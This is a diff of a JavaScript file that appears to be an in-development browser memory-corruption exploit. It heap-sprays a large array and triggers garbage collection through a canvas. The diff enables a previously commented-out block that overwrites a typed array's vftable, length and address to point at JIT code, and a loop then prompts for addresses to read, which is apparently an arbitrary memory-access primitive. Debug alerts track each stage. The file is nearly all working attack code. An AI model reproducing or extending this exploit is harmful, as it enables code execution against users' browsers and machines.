@@ -1,11 +1,11 @@
 <script>	
-alert("start31");
+alert("start32");
 function func(){
 for(var i=0;i<0x1000;i++){ 
 
  }
 }
-func();
+
 var spray=new Array(0x800);
 var tmp;
  for(var i=0;i<spray.length;i++){
@@ -29,7 +29,8 @@ var tmp;
   
 }
 alert("spray done");
-function gc() {
+func();
+ function gc() {
     try {
         var c = document.createElement("canvas");
         var gl = c.getContext("2d");
@@ -95,7 +96,7 @@ alert("ok");
 
 var a=0;
 var b="";
-/*
+
  a=0x50000000/2;
 while(s1.charCodeAt(a)!=0xAA00){
  a+=1;
@@ -126,7 +127,7 @@ for(var i=typedarray_index;i<typedarray_index+0x40/4;i++){
 spray[spray_index][typedarray_index]=vftable;
 spray[spray_index][typedarray_index+0x30/4]=0x10000;//length
 spray[spray_index][typedarray_index+0x38/4]=jitcode_addr-0x14;//addr;
- */
+ 
 while(1){
 a=prompt("addr");
 b="";
